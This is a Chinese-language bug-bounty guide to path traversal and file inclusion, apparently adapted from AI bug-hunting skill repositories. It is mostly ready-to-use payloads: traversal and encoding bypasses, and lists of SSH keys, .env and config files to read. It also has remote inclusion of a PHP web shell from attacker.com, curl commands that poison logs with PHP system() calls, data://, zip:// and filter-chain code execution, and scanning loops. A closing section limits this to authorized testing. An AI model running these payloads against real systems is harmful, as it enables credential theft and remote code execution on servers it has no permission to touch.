# 路径遍历 / 文件包含（Path Traversal / LFI / RFI）

> 让服务端去读 / 包含 / 执行「不该碰的文件」。能读 `/etc/passwd` = P1，读到配置 → DB 密码 → P0；任意文件删 = P0（**极易遗漏**）。SRC 高价值：任意文件读在 HackerOne 长期高频命中 High/Critical（GitLab 多个 16k–29k USD 案例）。

**取材来源**（本文件内容改编自，非整库复制）：
- [MyuriKanao/src-hunter-skill](https://github.com/MyuriKanao/src-hunter-skill)（00-index / 10-traversal-lfi / 11-rfi-logpoison / 12-php-wrappers，163 份 H1 已披露报告提炼）
- [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter)（31 份披露报告 + Synacktiv filter-chain 研究）
- [SnailSploit/Claude-Red](https://github.com/SnailSploit/Claude-Red)（HPP 手法，本类仅作边缘参考）
- 权威公开源：PayloadsAllTheThings / PortSwigger Web Security Academy / HackTricks / OWASP

---

## 1. 触发信号

- 文件路径入参：`?file=` `?path=` `?filename=` `?page=` `?include=` `?template=` `?download=`，值像文件名/路径
- 响应回显文件**内容**（不是回显你输入的路径本身）——`root:x:0:0:` 行、源码、配置键值
- 修改路径前后，响应长度/状态码出现**可复现**差异（`/etc/passwd` vs `/etc/passwd_<随机>`）
- 技术栈信号：`X-Powered-By: PHP` / `.php` / `PHPSESSID` → 试伪协议；Apache/Nginx 日志可读 → 日志投毒；`.jsp`/`/WEB-INF/` → Java 配置；`Server:` banner 为 Apache 2.4.49/2.4.50 → 已知 CVE `[Claude-BugHunter]`

## 2. 高频入口点

**高危参数名**（WooYun 案例频次，见本地 src-hunter 00-index §2.1）：

| 参数 | 出现次数 | 典型场景 |
|---|---|---|
| `filename` | 63 | 文件下载 / 附件 |
| `filepath` | 30 | 路径指定 |
| `path` | 20 | 通用路径 |
| `hdfile` | 14 | 特定 CMS |
| `inputFile` | 9 | Resin / Java |
| `file` | 7 | 通用 |
| `url` | 4 | SSRF / 文件读复合 |
| `filePath` / `FileUrl` / `XFileName` | 4 / 3 / 3 | Java 驼峰 / ASP.NET / CMS |

**命名规律**：`file, path, name, url, src, dir, folder`；下载类 `download, down, attachment, doc`；读取类 `read, load, get, open, input`；模板类 `template, tpl, page, include`。复合参数 `?filePath=x&fileName=y`、`?path=x&name=y` `[本地 src-hunter]`。

**高频漏洞端点**：`down.php`(20) `download.jsp`(17) `download.asp`(13) `do_download.jsp`(8) `download.php`(7) `download.ashx`(7) `viewsharenetdisk.php`(6) `GetPage.ashx`(6) `[本地 src-hunter]`。

## 3. 探测顺序（从最无害 → 最有杀伤力）

1. **确认路径入参**：`?file=/etc/passwd` 绝对路径、`?file=../../../../etc/passwd` 逐级加 `../`（1~10 层），看是否回显 `root:x:0:0:`。命中 = 文件**内容**出现；只回显你输入的路径/报错字符串 = **不是**确认。
2. **编码梯度**：字面 `../` 被拦后，依次试 `%2e%2e%2f` → `%252e%252e%252f` → `..%c0%af`（UTF-8 超长）→ `%u002e`（16-bit Unicode）→ `....//`（删一次后剩 `../`）。
3. **后缀/前缀绕过**：应用拼接 `.jpg` 或 `.php` → `%00` 截断、尾部 `?`/`#`；应用前置固定目录 → 加更多 `../` 逃逸。
4. **PHP 站切伪协议**：先 `php://filter/convert.base64-encode/resource=index.php` 读源码（**必须 base64**，原始 `<?php` 会被解析吞掉）；有源码再找更多 sink/密钥。
5. **升级执行（仅授权允许时）**：filter-chain → RCE（无需上传/可写文件）；或 data:// / php://input（需 `allow_url_include=On`）；或 RFI（需 `allow_url_include=On`）；或日志投毒（需日志可读）。
6. **盲注确认**：无回显时用 Burp Collaborator 回调（php://filter / RFI 指向 `http://<collab>/`），或「已知大文件 vs 不存在文件」三重确认的响应长度差。

## 4. Payload 区（每条标注出处）

### 4.1 基础遍历 + 编码梯度 `[本地 src-hunter]`

```text
?file=../etc/passwd
?file=../../../../../../etc/passwd          # 逐级加，最多 8-12 层
?file=/etc/passwd                           # 绝对路径，无前缀拼接时
?file=....//....//....//etc/passwd          # 过滤器删一次 ../ 后剩 ../
?file=..%2f..%2f..%2fetc%2fpasswd           # 单次 URL 编码
?file=..%252f..%252f..%252fetc%252fpasswd   # 双重编码（服务端解码两次）
?file=..%c0%af..%c0%af..%c0%afetc/passwd    # UTF-8 超长（Tomcat/GlassFish）
?file=..%c1%9c..%c1%9c..%c1%9cwindows\win.ini
?file=%u002e%u002e%u2215%u002e%u002e%u2215etc/passwd   # 16-bit Unicode（IIS/旧 Java）
?file=..\..\..\windows\win.ini              # Windows 反斜杠
?file=..%5c..%5c..%5cwindows%5cwin.ini
```

### 4.2 LFI 读敏感文件 `[本地 src-hunter]`

```text
# Linux 系统/账户
/etc/passwd   /etc/hosts   /etc/group   /etc/sudoers
/root/.ssh/id_rsa   /home/{user}/.ssh/id_rsa   /root/.bash_history
# 进程/环境（信息金矿）
/proc/self/environ   /proc/self/cmdline   /proc/self/fd/{n}   /proc/version
# Web 配置
/etc/nginx/nginx.conf   /etc/apache2/apache2.conf   /etc/my.cnf
# Java Web
/WEB-INF/web.xml   /WEB-INF/classes/jdbc.properties
/WEB-INF/classes/database.properties   /WEB-INF/classes/application.yml
../WEB-INF/web.xml   /../WEB-INF/web.xml%3f
# PHP/框架
/wp-config.php   /.env   /config.php   /application/config/database.php
# Windows/.NET
C:\windows\win.ini   C:\inetpub\wwwroot\web.config
C:\windows\system32\inetsrv\config\applicationHost.config
```

**指纹判读**：`root:x:0:0:` → /etc/passwd；`[boot loader]`/`[fonts]` → win.ini；`<?xml version="1.0"` + `<web-app` → web.xml；`connectionString=` → web.config `[本地 src-hunter]`。

### 4.3 RFI（需 `allow_url_include=On`）`[本地 src-hunter / Claude-BugHunter]`

```text
?file=http://attacker.com/shell.txt              # shell.txt 内容 <?php system($_GET['cmd']); ?>
?file=http://attacker.com/shell.txt?&cmd=id
?file=ftp://attacker.com/shell.txt
?file=htthttp://p://attacker.com/shell.txt       # 双写绕过关键字过滤
?file=HtTp://attacker.com/shell.txt              # 大小写混淆
# 无 RCE 也可确认 RFI：指向 Burp Collaborator HTTP URL，收到回调（服务器 IP）= 远程拉取发生
```

### 4.4 日志投毒（LFI → RCE）`[本地 src-hunter / Claude-BugHunter]`

```bash
# 投毒（把 PHP 写进 access log 的 User-Agent 或 URL 路径）
curl -A "<?php system(\$_GET['c']); ?>" https://target/
# 或路径投毒
curl "https://target/%3C%3Fphp%20system(%24_GET%5B'c'%5D)%3B%20%3F%3E"
# 先验证日志可读，再包含执行
?file=../../../var/log/apache2/access.log&c=id
?file=../../../var/log/nginx/access.log&c=whoami
?file=../../../var/log/httpd/access_log&c=cat /etc/passwd
# 候选日志：/var/log/apache2/access.log /error.log、/var/log/nginx/access.log、
#   /var/log/auth.log（SSH 用户名投毒）、/proc/self/environ
```

### 4.5 PHP Wrapper（filter / input / data / expect）`[本地 src-hunter / Claude-BugHunter]`

```text
# php://filter —— 读源码（永远 base64，原始 <?php 会被解析吞掉）
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://filter/convert.base64-encode/resource=wp-config.php
?file=php://filter/read=string.rot13/resource=config.php
?file=php://filter/convert.base64-encode/resource=../.env
# php://input —— POST body 直接当 PHP 执行（需 allow_url_include=On）
GET ?file=php://input     POST body: <?php system('id'); ?>
# data:// —— 内联执行（需 allow_url_include=On）
?file=data://text/plain,<?php system($_GET['c']); ?>&c=id
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id
# expect:// —— 直接命令执行（需安装 expect 扩展，罕见）
?file=expect://id
# zip:// / phar:// —— 归档内包含
?file=zip://uploads/shell.zip%23shell.txt&c=id    # %23 = #
?file=zip://uploads/image.jpg%23shell.txt&c=id    # 图片马（cat image.jpg shell.zip > image.jpg）
```

**filter-chain → RCE（无上传、无日志、无可写文件）**：把 `iconv` 转换链进 `php://filter`，构造字节预置到资源前，直到拼出完整 `<?php ... ?>` 再被 `include()` 执行。用公开工具生成 `python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'`，输出长 `php://filter|convert.iconv.*|...|resource=php://temp` 串丢进 sink。payload 可达 10–50KB，长度受限就改 POST body 或最小化 payload `[Claude-BugHunter / Synacktiv 2022]`。

### 4.6 路径规范化绕过 / Bypass 矩阵 `[本地 src-hunter]`

| 拦 | 绕 |
|---|---|
| `../` 字面拦 | URL 编码 / 双重编码 / Unicode 超长 / `....//` / `..\../` |
| 后缀白名单（`.jpg`） | `%00` 截断：`../../etc/passwd%00.jpg`；`?` / `#` 截断 |
| 黑名单 `passwd` | `pas%73wd` / `passwD` |
| 仅允许某目录 | 规范化差异：`/allowed/../etc/passwd` |
| 绝对路径拦 | 相对路径 + 多层 `../` |
| 多 `../` 拦 | 嵌套：`....//` 删一次后剩 `../` |

其它变体：`/./` 冗余、`//` 双斜杠、`/;/` 分号路径段、`/admin;.jpg`（IIS/Tomcat 截断）、base64 路径（`?filename=<base64 of ../../windows/win.ini>`）`[本地 src-hunter]`。

## 5. 工具用法

```bash
# gf 提取候选 + grep 定位路径入参
cat recon/$TARGET/urls.txt | gf lfi > lfi-candidates.txt
grep -E "(\?|&)(page|file|path|template|view|lang|module|include|doc|load|read|content|download|img|pdf|report|dir)=" urls.txt

# 逐级 ../ 批量探测（标准 8-12 层）
for i in 1 2 3 4 5 6 7 8 9 10; do
  prefix=$(printf '../%.0s' $(seq 1 $i))
  curl -s "https://target/down.php?file=${prefix}etc/passwd" | grep -q "root:" && echo "Hit: $i levels"
done

# 编码递增
for enc in "../" "..%2f" "%2e%2e%2f" "%252e%252e%252f" "..%c0%af" "....//"; do
  curl -s "https://target/down.php?file=${enc}${enc}${enc}etc/passwd"
done

# ffuf 枚举 LFI 路径
ffuf -u "https://target/page.php?file=FUZZ" -w ~/wordlists/lfi-paths.txt -mc 200,301,302
ffuf -u "https://target/page.php?file=FUZZ" -w ~/wordlists/lfi.txt -mc all -fr "not found"
dotdotpwn -m http -h target.com -o unix
```

> 纪律：自动化只用于**扩大候选**，每条命中必须手工复现并保留证据；盲注用 Burp Collaborator 回调确认，不靠单次状态码/长度差下结论。

## 6. 证据要求

**「已确认」必须满足**（不是假阳性）：响应是文件**真实内容**，不是回显你的路径。`/etc/passwd` 必须含 `root:x:0:0:root:/root:` 行；源码读取的 base64 **必须能解出合法 PHP**（解出乱码/空 = 没读到）。用 `/etc/passwd` vs `/etc/passwd_<随机>` 对照排除反射。

**PoC 模板**：

```http
GET /download.php?file=../../../../etc/passwd HTTP/1.1
Host: target.com
→ 200 OK，正文：
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
... (前 5 行作证，其余脱敏)
```

**盲注/OOB 证明**：无回显时用 php://filter / RFI 让 payload 回调到**唯一 Burp Collaborator 子域**，要求 DNS + HTTP 命中且来源为服务器 IP 才算执行；延时/长度差需三重确认（已知大文件 vs 不存在文件 vs 第二个已知文件），一次差异即撤回。

**CVSS 参考**：任意文件读（含敏感）`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N = 7.5`；仅读公开内容 `= 5.3`；读到 DB 配置链到数据库 `= 9.8`；任意文件删 `= 8.6`；任意文件覆盖（webroot）`= 9.8` `[本地 src-hunter]`。

## 7. 合规边界 / 不要做的事

- **禁**：用读到的 SSH 私钥 / DB 密码登录任何服务。
- **禁**：读 `/etc/shadow`（即使能读，看到 `root:x:` 行即停，只证明「探测能力」）。
- **禁**：批量读多个用户的 `.bash_history` / `.aws/credentials`，仅证明 1 个 sample。
- **禁**：任意文件删除真实生产文件；在测试环境或临时 PoC 文件上验证删除能力。
- **禁**：实际执行 RCE（filter-chain / RFI / 日志投毒 / data://）落地命令——「证明能执行 `id`」即可，不反弹 shell、不写 webshell。
- **禁**：把读到的源码/配置上传第三方仓库；本地保存，报告后删除。
- **脱敏**：配置/源码只附前几行 + sha256 hash 证明拿到原文；PII 只留前 2 + 后 2 字符。
